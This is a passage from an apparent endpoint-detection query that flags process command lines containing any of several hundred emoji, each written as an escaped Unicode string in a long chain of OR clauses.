tgt.process.cmdline contains \"\ud83c\udfb3\" or tgt.process.cmdline contains \"\ud83c\udfae\" or tgt.process.cmdline contains \"\ud83c\udfb0\" or tgt.process.cmdline contains \"\ud83e\udde9\" or tgt.process.cmdline contains \"\ud83d\ude97\" or tgt.process.cmdline contains \"\ud83d\ude95\" or tgt.process.cmdline contains \"\ud83d\ude99\" or tgt.process.cmdline contains \"\ud83d\ude8c\" or tgt.process.cmdline contains \"\ud83d\ude8e\" or tgt.process.cmdline contains \"\ud83c\udfce\" or tgt.process.cmdline contains \"\ud83d\ude93\" or tgt.process.cmdline contains \"\ud83d\ude91\" or tgt.process.cmdline contains \"\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\ude90\" or tgt.process.cmdline contains \"\ud83d\udefb\" or tgt.process.cmdline contains \"\ud83d\ude9a\" or tgt.process.cmdline contains \"\ud83d\ude9b\" or tgt.process.cmdline contains \"\ud83d\ude9c\" or tgt.process.cmdline contains \"\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udef4\" or tgt.process.cmdline contains \"\ud83d\udeb2\" or tgt.process.cmdline contains \"\ud83d\udef5\" or tgt.process.cmdline contains \"\ud83c\udfcd\" or tgt.process.cmdline contains \"\ud83d\udefa\" or tgt.process.cmdline contains \"\ud83d\udea8\" or tgt.process.cmdline contains \"\ud83d\ude94\" or tgt.process.cmdline contains \"\ud83d\ude8d\" or tgt.process.cmdline contains \"\ud83d\ude98\" or tgt.process.cmdline contains \"\ud83d\ude96\" or tgt.process.cmdline contains \"\ud83d\udede\" or tgt.process.cmdline contains \"\ud83d\udea1\" or tgt.process.cmdline contains \"\ud83d\udea0\" or tgt.process.cmdline contains \"\ud83d\ude9f\" or tgt.process.cmdline contains \"\ud83d\ude83\" or tgt.process.cmdline contains \"\ud83d\ude8b\" or tgt.process.cmdline contains \"\ud83d\ude9e\" or tgt.process.cmdline contains \"\ud83d\ude9d\" or tgt.process.cmdline contains \"\ud83d\ude84\" or tgt.process.cmdline contains \"\ud83d\ude85\" or tgt.process.cmdline contains \"\ud83d\ude88\" or tgt.process.cmdline contains \"\ud83d\ude82\" or tgt.process.cmdline contains \"\ud83d\ude86\" or tgt.process.cmdline contains \"\ud83d\ude87\" or tgt.process.cmdline contains \"\ud83d\ude8a\" or tgt.process.cmdline contains \"\ud83d\ude89\" or tgt.process.cmdline contains \"\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeeb\" or tgt.process.cmdline contains \"\ud83d\udeec\" or tgt.process.cmdline contains \"\ud83d\udee9\" or tgt.process.cmdline contains \"\ud83d\udcba\" or tgt.process.cmdline contains \"\ud83d\udef0\" or tgt.process.cmdline contains \"\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udef8\" or tgt.process.cmdline contains \"\ud83d\ude81\" or tgt.process.cmdline contains \"\ud83d\udef6\" or tgt.process.cmdline contains \"\u26f5\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea4\" or tgt.process.cmdline contains \"\ud83d\udee5\" or tgt.process.cmdline contains \"\ud83d\udef3\" or tgt.process.cmdline contains \"\u26f4\" or tgt.process.cmdline contains \"\ud83d\udea2\" or tgt.process.cmdline contains \"\u2693\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udedf\" or tgt.process.cmdline contains \"\ud83e\ude9d\" or tgt.process.cmdline contains \"\u26fd\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea7\" or tgt.process.cmdline contains \"\ud83d\udea6\" or tgt.process.cmdline contains \"\ud83d\udea5\" or tgt.process.cmdline contains \"\ud83d\ude8f\" or tgt.process.cmdline contains \"\ud83d\uddfa\" or tgt.process.cmdline contains \"\ud83d\uddff\" or tgt.process.cmdline contains \"\ud83d\uddfd\" or tgt.process.cmdline contains \"\ud83d\uddfc\" or tgt.process.cmdline contains \"\ud83c\udff0\" or tgt.process.cmdline contains \"\ud83c\udfef\" or tgt.process.cmdline contains \"\ud83c\udfdf\" or tgt.process.cmdline contains \"\ud83c\udfa1\" or tgt.process.cmdline contains \"\ud83c\udfa2\" or tgt.process.cmdline contains \"\ud83d\udedd\" or tgt.process.cmdline contains \"\ud83c\udfa0\" or tgt.process.cmdline contains \"\u26f2\ufe0f\" or tgt.process.cmdline contains \"\u26f1\" or tgt.process.cmdline contains \"\ud83c\udfd6\" or tgt.process.cmdline contains \"\ud83c\udfdd\" or tgt.process.cmdline contains \"\ud83c\udfdc\" or tgt.process.cmdline contains \"\ud83c\udf0b\" or tgt.process.cmdline contains \"\u26f0\" or tgt.process.cmdline contains \"\ud83c\udfd4\" or tgt.process.cmdline contains \"\ud83d\uddfb\" or tgt.process.cmdline contains \"\ud83c\udfd5\" or tgt.process.cmdline contains \"\u26fa\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded6\" or tgt.process.cmdline contains \"\ud83c\udfe0\" or tgt.process.cmdline contains \"\ud83c\udfe1\" or tgt.process.cmdline contains \"\ud83c\udfd8\" or tgt.process.cmdline contains \"\ud83c\udfda\" or tgt.process.cmdline contains \"\ud83c\udfd7\" or tgt.process.cmdline contains \"\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83c\udfe2\" or tgt.process.cmdline contains \"\ud83c\udfec\" or tgt.process.cmdline contains \"\ud83c\udfe3\" or tgt.process.cmdline contains \"\ud83c\udfe4\" or tgt.process.cmdline contains \"\ud83c\udfe5\" or tgt.process.cmdline contains \"\ud83c\udfe6\" or tgt.process.cmdline contains \"\ud83c\udfe8\" or tgt.process.cmdline contains \"\ud83c\udfea\" or tgt.process.cmdline contains \"\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83c\udfe9\" or tgt.process.cmdline contains \"\ud83d\udc92\" or tgt.process.cmdline contains \"\ud83c\udfdb\" or tgt.process.cmdline contains \"\u26ea\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd4c\" or tgt.process.cmdline contains \"\ud83d\udd4d\" or tgt.process.cmdline contains \"\ud83d\uded5\" or tgt.process.cmdline contains \"\ud83d\udd4b\" or tgt.process.cmdline contains \"\u26e9\" or tgt.process.cmdline contains \"\ud83d\udee4\" or tgt.process.cmdline contains \"\ud83d\udee3\" or tgt.process.cmdline contains \"\ud83d\uddfe\" or tgt.process.cmdline contains \"\ud83c\udf91\" or tgt.process.cmdline contains \"\ud83c\udfde\" or tgt.process.cmdline contains \"\ud83c\udf05\" or tgt.process.cmdline contains \"\ud83c\udf04\" or tgt.process.cmdline contains \"\ud83c\udf20\" or tgt.process.cmdline contains \"\ud83c\udf87\" or tgt.process.cmdline contains \"\ud83c\udf86\" or tgt.process.cmdline contains \"\ud83c\udf07\" or tgt.process.cmdline contains \"\ud83c\udf06\" or tgt.process.cmdline contains \"\ud83c\udfd9\" or tgt.process.cmdline contains \"\ud83c\udf03\" or tgt.process.cmdline contains \"\ud83c\udf0c\" or tgt.process.cmdline contains \"\ud83c\udf09\" or tgt.process.cmdline contains \"\ud83c\udf01\" or tgt.process.cmdline contains \"\u231a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcf1\" or tgt.process.cmdline contains \"\ud83d\udcf2\" or tgt.process.cmdline contains \"\ud83d\udcbb\" or tgt.process.cmdline contains \"\u2328\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udda5\" or tgt.process.cmdline contains \"\ud83d\udda8\" or tgt.process.cmdline contains \"\ud83d\uddb1\" or tgt.process.cmdline contains \"\ud83d\uddb2\" or tgt.process.cmdline contains \"\ud83d\udd79\" or tgt.process.cmdline contains \"\ud83d\udddc\" or tgt.process.cmdline contains \"\ud83d\udcbd\" or tgt.process.cmdline contains \"\ud83d\udcbe\" or tgt.process.cmdline contains \"\ud83d\udcbf\" or tgt.process.cmdline contains \"\ud83d\udcc0\" or tgt.process.cmdline contains \"\ud83d\udcfc\" or tgt.process.cmdline contains \"\ud83d\udcf7\" or tgt.process.cmdline contains \"\ud83d\udcf8\" or tgt.process.cmdline contains \"\ud83d\udcf9\" or tgt.process.cmdline contains \"\ud83c\udfa5\" or tgt.process.cmdline contains \"\ud83d\udcfd\" or tgt.process.cmdline contains \"\ud83c\udf9e\" or tgt.process.cmdline contains \"\ud83d\udcde\" or tgt.process.cmdline contains \"\u260e\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcdf\" or tgt.process.cmdline contains \"\ud83d\udce0\" or tgt.process.cmdline contains \"\ud83d\udcfa\" or tgt.process.cmdline contains \"\ud83d\udcfb\" or tgt.process.cmdline contains \"\ud83c\udf99\" or tgt.process.cmdline contains \"\ud83c\udf9a\" or tgt.process.cmdline contains \"\ud83c\udf9b\" or tgt.process.cmdline contains \"\ud83e\udded\" or tgt.process.cmdline contains \"\u23f1\" or tgt.process.cmdline contains \"\u23f2\" or tgt.process.cmdline contains \"\u23f0\" or tgt.process.cmdline contains \"\ud83d\udd70\" or tgt.process.cmdline contains \"\u231b\ufe0f\" or tgt.process.cmdline contains \"\u23f3\" or tgt.process.cmdline contains \"\ud83d\udce1\" or tgt.process.cmdline contains \"\ud83d\udd0b\" or tgt.process.cmdline contains \"\ud83e\udeab\" or tgt.process.cmdline contains \"\ud83d\udd0c\" or tgt.process.cmdline contains \"\ud83d\udca1\" or tgt.process.cmdline contains \"\ud83d\udd26\" or tgt.process.cmdline contains \"\ud83d\udd6f\" or tgt.process.cmdline contains \"\ud83e\ude94\" or tgt.process.cmdline contains \"\ud83e\uddef\" or tgt.process.cmdline contains \"\ud83d\udee2\" or tgt.process.cmdline contains \"\ud83d\udcb8\" or tgt.process.cmdline contains \"\ud83d\udcb5\" or tgt.process.cmdline contains \"\ud83d\udcb4\" or tgt.process.cmdline contains \"\ud83d\udcb6\" or tgt.process.cmdline contains \"\ud83d\udcb7\" or tgt.process.cmdline contains \"\ud83e\ude99\" or tgt.process.cmdline contains \"\ud83d\udcb0\" or tgt.process.cmdline contains \"\ud83d\udcb3\" or tgt.process.cmdline contains \"\ud83d\udc8e\" or tgt.process.cmdline contains \"\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\ude9c\" or tgt.process.cmdline contains \"\ud83e\uddf0\" or tgt.process.cmdline contains \"\ud83e\ude9b\" or tgt.process.cmdline contains \"\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udd28\" or tgt.process.cmdline contains \"\u2692\" or tgt.process.cmdline contains \"\ud83d\udee0\" or tgt.process.cmdline contains \"\u26cf\" or tgt.process.cmdline contains \"\ud83e\ude9a\" or tgt.process.cmdline contains \"\ud83d\udd29\" or tgt.process.cmdline contains \"\u2699\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udea4\" or tgt.process.cmdline contains \"\ud83e\uddf1\" or tgt.process.cmdline contains \"\u26d3\" or tgt.process.cmdline contains \"\ud83e\uddf2\" or tgt.process.cmdline contains \"\ud83d\udd2b\" or tgt.process.cmdline contains \"\ud83d\udca3\" or tgt.process.cmdline contains \"\ud83e\udde8\" or tgt.process.cmdline contains \"\ud83e\ude93\" or tgt.process.cmdline contains \"\ud83d\udd2a\" or tgt.process.cmdline contains \"\ud83d\udde1\" or tgt.process.cmdline contains \"\u2694\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udee1\" or tgt.process.cmdline contains \"\ud83d\udeac\" or tgt.process.cmdline contains \"\u26b0\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udea6\" or tgt.process.cmdline contains \"\u26b1\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udffa\" or tgt.process.cmdline contains \"\ud83d\udd2e\" or tgt.process.cmdline contains \"\ud83d\udcff\" or tgt.process.cmdline contains \"\ud83e\uddff\" or tgt.process.cmdline contains \"\ud83e\udeac\" or tgt.process.cmdline contains \"\ud83d\udc88\" or tgt.process.cmdline contains \"\u2697\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd2d\" or tgt.process.cmdline contains \"\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udd73\" or tgt.process.cmdline contains \"\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83e\ude7a\" or tgt.process.cmdline contains \"\ud83e\ude7b\" or tgt.process.cmdline contains \"\ud83e\ude7c\" or tgt.process.cmdline contains \"\ud83d\udc8a\" or tgt.process.cmdline contains \"\ud83d\udc89\" or tgt.process.cmdline contains \"\ud83e\ude78\" or tgt.process.cmdline contains \"\ud83e\uddec\" or tgt.process.cmdline contains \"\ud83e\udda0\" or tgt.process.cmdline contains \"\ud83e\uddeb\" or tgt.process.cmdline contains \"\ud83e\uddea\" or tgt.process.cmdline contains \"\ud83c\udf21\" or tgt.process.cmdline contains \"\ud83e\uddf9\" or tgt.process.cmdline contains \"\ud83e\udea0\" or tgt.process.cmdline contains \"\ud83e\uddfa\" or tgt.process.cmdline contains \"\ud83e\uddfb\" or tgt.process.cmdline contains \"\ud83d\udebd\" or tgt.process.cmdline contains \"\ud83d\udeb0\" or tgt.process.cmdline contains \"\ud83d\udebf\" or tgt.process.cmdline contains \"\ud83d\udec1\" or tgt.process.cmdline contains \"\ud83d\udec0\" or tgt.process.cmdline contains \"\ud83e\uddfc\" or tgt.process.cmdline contains \"\ud83e\udea5\" or tgt.process.cmdline contains \"\ud83e\ude92\" or tgt.process.cmdline contains \"\ud83e\uddfd\" or tgt.process.cmdline contains \"\ud83e\udea3\" or tgt.process.cmdline contains \"\ud83e\uddf4\" or tgt.process.cmdline contains \"\ud83d\udece\" or tgt.process.cmdline contains \"\ud83d\udd11\" or tgt.process.cmdline contains \"\ud83d\udddd\" or tgt.process.cmdline contains \"\ud83d\udeaa\" or tgt.process.cmdline contains \"\ud83e\ude91\" or tgt.process.cmdline contains \"\ud83d\udecb\" or tgt.process.cmdline contains \"\ud83d\udecf\" or tgt.process.cmdline contains \"\ud83d\udecc\" or tgt.process.cmdline contains \"\ud83e\uddf8\" or tgt.process.cmdline contains \"\ud83e\ude86\" or tgt.process.cmdline contains \"\ud83d\uddbc\" or tgt.process.cmdline contains \"\ud83e\ude9e\" or tgt.process.cmdline contains \"\ud83e\ude9f\" or tgt.process.cmdline contains \"\ud83d\udecd\" or tgt.process.cmdline contains \"\ud83d\uded2\" or tgt.process.cmdline contains \"\ud83c\udf81\" or tgt.process.cmdline contains \"\ud83c\udf88\" or tgt.process.cmdline contains \"\ud83c\udf8f\" or tgt.process.cmdline contains \"\ud83c\udf80\" or tgt.process.cmdline contains \"\ud83e\ude84\" or tgt.process.cmdline contains \"\ud83e\ude85\" or tgt.process.cmdline contains \"\ud83c\udf8a\" or tgt.process.cmdline contains \"\ud83c\udf89\" or tgt.process.cmdline contains \"\ud83e\udea9\" or tgt.process.cmdline contains \"\ud83c\udf8e\" or tgt.process.cmdline contains \"\ud83c\udfee\" or tgt.process.cmdline contains \"\ud83c\udf90\" or tgt.process.cmdline contains \"\ud83e\udde7\" or tgt.process.cmdline contains \"\u2709\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udce9\" or tgt.process.cmdline contains \"\ud83d\udce8\" or tgt.process.cmdline contains \"\ud83d\udce7\" or tgt.process.cmdline contains \"\ud83d\udc8c\" or tgt.process.cmdline contains \"\ud83d\udce5\" or tgt.process.cmdline contains \"\ud83d\udce4\" or tgt.process.cmdline contains \"\ud83d\udce6\" or tgt.process.cmdline contains \"\ud83c\udff7\" or tgt.process.cmdline contains \"\ud83e\udea7\" or tgt.process.cmdline contains \"\ud83d\udcea\" or tgt.process.cmdline contains \"\ud83d\udceb\" or tgt.process.cmdline contains \"\ud83d\udcec\" or tgt.process.cmdline contains \"\ud83d\udced\" or tgt.process.cmdline contains \"\ud83d\udcee\" or tgt.process.cmdline contains \"\ud83d\udcef\" or tgt.process.cmdline contains \"\ud83d\udcdc\" or tgt.process.cmdline contains \"\ud83d\udcc3\" or tgt.process.cmdline contains \"\ud83d\udcc4\" or tgt.process.cmdline contains \"\ud83d\udcd1\" or tgt.process.cmdline contains \"\ud83e\uddfe\" or tgt.process.cmdline contains \"\ud83d\udcca\" or tgt.process.cmdline contains \"\ud83d\udcc8\" or tgt.process.cmdline contains \"\ud83d\udcc9\" or tgt.process.cmdline contains \"\ud83d\uddd2\" or tgt.process.cmdline contains \"\ud83d\uddd3\" or tgt.process.cmdline contains \"\ud83d\udcc6\" or tgt.process.cmdline contains \"\ud83d\udcc5\" or tgt.process.cmdline contains \"\ud83d\uddd1\" or tgt.process.cmdline contains \"\ud83e\udeaa\" or tgt.process.cmdline contains \"\ud83d\udcc7\" or tgt.process.cmdline contains \"\ud83d\uddc3\" or tgt.process.cmdline contains \"\ud83d\uddf3\" or tgt.process.cmdline contains \"\ud83d\uddc4\" or tgt.process.cmdline contains \"\ud83d\udccb\" or tgt.process.cmdline contains \"\ud83d\udcc1\" or tgt.process.cmdline contains \"\ud83d\udcc2\" or tgt.process.cmdline contains \"\ud83d\uddc2\" or tgt.process.cmdline contains \"\ud83d\uddde\" or tgt.process.cmdline contains \"\ud83d\udcf0\" or tgt.process.cmdline contains \"\ud83d\udcd3\" or tgt.process.cmdline contains \"\ud83d\udcd4\" or tgt.process.cmdline contains \"\ud83d\udcd2\" or tgt.process.cmdline contains \"\ud83d\udcd5\" or tgt.process.cmdline contains \"\ud83d\udcd7\" or tgt.process.cmdline contains \"\ud83d\udcd8\" or tgt.process.cmdline contains \"\ud83d\udcd9\" or tgt.process.cmdline contains \"\ud83d\udcda\" or tgt.process.cmdline contains \"\ud83d\udcd6\" or tgt.process.cmdline contains \"\ud83d\udd16\" or tgt.process.cmdline contains \"\ud83e\uddf7\" or tgt.process.cmdline contains \"\ud83d\udd17\" or tgt.process.cmdline contains \"\ud83d\udcce\" or tgt.process.cmdline contains \"\ud83d\udd87\" or tgt.process.cmdline contains \"\ud83d\udcd0\" or tgt.process.cmdline contains \"\ud83d\udccf\" or tgt.process.cmdline contains \"\ud83e\uddee\" or tgt.process.cmdline contains \"\ud83d\udccc\" or tgt.process.cmdline contains \"\ud83d\udccd\" or tgt.process.cmdline contains \"\u2702\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd8a\" or tgt.process.cmdline contains \"\ud83d\udd8b\" or tgt.process.cmdline contains \"\u2712\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd8c\" or tgt.process.cmdline contains \"\ud83d\udd8d\" or tgt.process.cmdline contains \"\ud83d\udcdd\" or tgt.process.cmdline contains \"\u270f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd0d\" or tgt.process.cmdline contains \"\ud83d\udd0e\" or tgt.process.cmdline contains \"\ud83d\udd0f\" or tgt.process.cmdline contains \"\ud83d\udd10\" or tgt.process.cmdline contains \"\ud83d\udd12\" or tgt.process.cmdline contains \"\ud83d\udd13\u2764\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udde1\" or tgt.process.cmdline contains \"\ud83d\udc9b\" or tgt.process.cmdline contains \"\ud83d\udc9a\" or tgt.process.cmdline contains \"\ud83d\udc99\" or tgt.process.cmdline contains \"\ud83d\udc9c\" or tgt.process.cmdline contains \"\ud83d\udda4\" or tgt.process.cmdline contains \"\ud83e\udd0d\" or tgt.process.cmdline contains \"\ud83e\udd0e\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83d\udd25\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83d\udc94\" or tgt.process.cmdline contains \"\u2763\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc95\" or tgt.process.cmdline contains \"\ud83d\udc9e\" or tgt.process.cmdline contains \"\ud83d\udc93\" or tgt.process.cmdline contains \"\ud83d\udc97\" or tgt.process.cmdline contains \"\ud83d\udc96\" or tgt.process.cmdline contains \"\ud83d\udc98\" or tgt.process.cmdline contains \"\ud83d\udc9d\" or tgt.process.cmdline contains \"\ud83d\udc9f\" or tgt.process.cmdline contains \"\u262e\ufe0f\" or tgt.process.cmdline contains \"\u271d\ufe0f\" or tgt.process.cmdline contains \"\u262a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd49\" or tgt.process.cmdline contains \"\u2638\ufe0f\" or tgt.process.cmdline contains \"\u2721\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd2f\" or tgt.process.cmdline contains \"\ud83d\udd4e\" or tgt.process.cmdline contains \"\u262f\ufe0f\" or tgt.process.cmdline contains \"\u2626\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded0\" or tgt.process.cmdline contains \"\u26ce\" or tgt.process.cmdline contains \"\u2648\ufe0f\" or tgt.process.cmdline contains \"\u2649\ufe0f\" or tgt.process.cmdline contains \"\u264a\ufe0f\" or tgt.process.cmdline contains \"\u264b\ufe0f\" or tgt.process.cmdline contains \"\u264c\ufe0f\" or tgt.process.cmdline contains \"\u264d\ufe0f\" or tgt.process.cmdline contains \"\u264e\ufe0f\" or tgt.process.cmdline contains \"\u264f\ufe0f\" or tgt.process.cmdline contains \"\u2650\ufe0f\" or tgt.process.cmdline contains \"\u2651\ufe0f\" or tgt.process.cmdline contains \"\u2652\ufe0f\" or tgt.process.cmdline contains \"\u2653\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd94\" or tgt.process.cmdline contains \"\u269b\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude51\" or tgt.process.cmdline contains \"\u2622\ufe0f\" or tgt.process.cmdline contains \"\u2623\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcf4\" or tgt.process.cmdline contains \"\ud83d\udcf3\" or tgt.process.cmdline contains \"\ud83c\ude36\" or tgt.process.cmdline contains \"\ud83c\ude1a\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude38\" or tgt.process.cmdline contains \"\ud83c\ude3a\" or tgt.process.cmdline contains \"\ud83c\ude37\ufe0f\" or tgt.process.cmdline contains \"\u2734\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd9a\" or tgt.process.cmdline contains \"\ud83d\udcae\" or tgt.process.cmdline contains \"\ud83c\ude50\" or tgt.process.cmdline contains \"\u3299\ufe0f\" or tgt.process.cmdline contains \"\u3297\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude34\" or tgt.process.cmdline contains \"\ud83c\ude35\" or tgt.process.cmdline contains \"\ud83c\ude39\" or tgt.process.cmdline contains \"\ud83c\ude32\" or tgt.process.cmdline contains \"\ud83c\udd70\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd71\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd8e\" or tgt.process.cmdline contains \"\ud83c\udd91\" or tgt.process.cmdline contains \"\ud83c\udd7e\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd98\" or tgt.process.cmdline contains \"\u274c\" or tgt.process.cmdline contains \"\u2b55\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded1\" or tgt.process.cmdline contains \"\u26d4\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcdb\" or tgt.process.cmdline contains \"\ud83d\udeab\" or tgt.process.cmdline contains \"\ud83d\udcaf\" or tgt.process.cmdline contains \"\ud83d\udca2\" or tgt.process.cmdline contains \"\u2668\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb7\" or tgt.process.cmdline contains \"\ud83d\udeaf\" or tgt.process.cmdline contains \"\ud83d\udeb3\" or tgt.process.cmdline contains \"\ud83d\udeb1\" or tgt.process.cmdline contains \"\ud83d\udd1e\" or tgt.process.cmdline contains \"\ud83d\udcf5\" or tgt.process.cmdline contains \"\ud83d\udead\" or tgt.process.cmdline contains \"\u2757\ufe0f\" or tgt.process.cmdline contains \"\u2755\" or tgt.process.cmdline contains \"\u2753\" or tgt.process.cmdline contains \"\u2754\" or tgt.process.cmdline contains \"\u203c\ufe0f\" or tgt.process.cmdline contains \"\u2049\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd05\" or tgt.process.cmdline contains \"\ud83d\udd06\" or tgt.process.cmdline contains \"\u303d\ufe0f\" or tgt.process.cmdline contains \"\u26a0\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb8\" or tgt.process.cmdline contains \"\ud83d\udd31\" or tgt.process.cmdline contains \"\u269c\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd30\" or tgt.process.cmdline contains \"\u267b\ufe0f\" or tgt.process.cmdline contains \"\u2705\" or tgt.process.cmdline contains \"\ud83c\ude2f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcb9\" or tgt.process.cmdline contains \"\u2747\ufe0f\" or tgt.process.cmdline contains \"\u2733\ufe0f\" or tgt.process.cmdline contains \"\u274e\" or tgt.process.cmdline contains \"\ud83c\udf10\" or tgt.process.cmdline contains \"\ud83d\udca0\" or tgt.process.cmdline contains \"\u24c2\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf00\" or tgt.process.cmdline contains \"\ud83d\udca4\" or tgt.process.cmdline contains \"\ud83c\udfe7\" or tgt.process.cmdline contains \"\ud83d\udebe\" or tgt.process.cmdline contains \"\u267f\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd7f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded7\" or tgt.process.cmdline contains \"\ud83c\ude33\" or tgt.process.cmdline contains \"\ud83c\ude02\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec2\" or tgt.process.cmdline contains \"\ud83d\udec3\" or tgt.process.cmdline contains \"\ud83d\udec4\" or tgt.process.cmdline contains \"\ud83d\udec5\" or tgt.process.cmdline contains \"\ud83d\udeb9\" or tgt.process.cmdline contains \"\ud83d\udeba\" or tgt.process.cmdline contains \"\ud83d\udebc\" or tgt.process.cmdline contains \"\u26a7\" or tgt.process.cmdline contains \"\ud83d\udebb\" or tgt.process.cmdline contains \"\ud83d\udeae\" or tgt.process.cmdline contains \"\ud83c\udfa6\" or tgt.process.cmdline contains \"\ud83d\udcf6\" or tgt.process.cmdline contains \"\ud83c\ude01\" or tgt.process.cmdline contains \"\ud83d\udd23\" or tgt.process.cmdline contains \"\u2139\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd24\" or tgt.process.cmdline contains \"\ud83d\udd21\" or tgt.process.cmdline contains \"\ud83d\udd20\" or tgt.process.cmdline contains \"\ud83c\udd96\" or tgt.process.cmdline contains \"\ud83c\udd97\" or tgt.process.cmdline contains \"\ud83c\udd99\" or tgt.process.cmdline contains \"\ud83c\udd92\" or tgt.process.cmdline contains \"\ud83c\udd95\" or tgt.process.cmdline contains \"\ud83c\udd93\" or tgt.process.cmdline contains \"0\ufe0f\u20e3\" or tgt.process.cmdline contains \"1\ufe0f\u20e3\" or tgt.process.cmdline contains \"2\ufe0f\u20e3\" or tgt.process.cmdline contains \"3\ufe0f\u20e3\" or tgt.process.cmdline contains \"4\ufe0f\u20e3\" or tgt.process.cmdline contains \"5\ufe0f\u20e3\" or tgt.process.cmdline contains \"6\ufe0f\u20e3\" or tgt.process.cmdline contains \"7\ufe0f\u20e3\" or tgt.process.cmdline contains \"8\ufe0f\u20e3\" or tgt.process.cmdline contains \"9\ufe0f\u20e3\" or tgt.process.cmdline contains \"\ud83d\udd1f\" or tgt.process.cmdline contains \"\ud83d\udd22\" or tgt.process.cmdline contains \"#\ufe0f\u20e3\" or tgt.process.cmdline contains \"\ufe0f\u20e3\" or tgt.process.cmdline contains \"\u23cf\ufe0f\" or tgt.process.cmdline contains \"\u25b6\ufe0f\" or tgt.process.cmdline contains \"\u23f8\" or tgt.process.cmdline contains \"\u23ef\" or tgt.process.cmdline contains \"\u23f9\" or tgt.process.cmdline contains \"\u23fa\" or tgt.process.cmdline contains \"\u23ed\" or tgt.process.cmdline contains \"\u23ee\" or tgt.process.cmdline contains \"\u23e9\" or tgt.process.cmdline contains \"\u23ea\" or tgt.process.cmdline contains \"\u23eb\" or tgt.process.cmdline contains \"\u23ec\" or tgt.process.cmdline contains \"\u25c0\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd3c\" or tgt.process.cmdline contains \"\ud83d\udd3d\" or tgt.process.cmdline contains \"\u27a1\ufe0f\" or tgt.process.cmdline contains \"\u2b05\ufe0f\" or tgt.process.cmdline contains \"\u2b06\ufe0f\" or tgt.process.cmdline contains \"\u2b07\ufe0f\" or tgt.process.cmdline contains \"\u2197\ufe0f\" or tgt.process.cmdline contains \"\u2198\ufe0f\" or tgt.process.cmdline contains \"\u2199\ufe0f\" or tgt.process.cmdline contains \"\u2196\ufe0f\" or tgt.process.cmdline contains \"\u2195\ufe0f\" or tgt.process.cmdline contains \"\u2194\ufe0f\" or tgt.process.cmdline contains \"\u21aa\ufe0f\" or tgt.process.cmdline contains \"\u21a9\ufe0f\" or tgt.process.cmdline contains \"\u2934\ufe0f\" or tgt.process.cmdline contains \"\u2935\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd00\" or tgt.process.cmdline contains \"\ud83d\udd01\" or tgt.process.cmdline contains \"\ud83d\udd02\" or tgt.process.cmdline contains \"\ud83d\udd04\" or tgt.process.cmdline contains \"\ud83d\udd03\" or tgt.process.cmdline contains \"\ud83c\udfb5\" or tgt.process.cmdline contains \"\ud83c\udfb6\" or tgt.process.cmdline contains \"\u2795\" or tgt.process.cmdline contains \"\u2796\" or tgt.process.cmdline contains \"\u2797\" or tgt.process.cmdline contains \"\u2716\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udff0\" or tgt.process.cmdline contains \"\u267e\" or tgt.process.cmdline contains \"\ud83d\udcb2\" or tgt.process.cmdline contains \"\ud83d\udcb1\" or tgt.process.cmdline contains \"\u2122\ufe0f\" or tgt.process.cmdline contains \"\u00a9\ufe0f\" or tgt.process.cmdline contains \"\u00ae\ufe0f\" or tgt.process.cmdline contains \"\u3030\ufe0f\" or tgt.process.cmdline contains \"\u27b0\" or tgt.process.cmdline 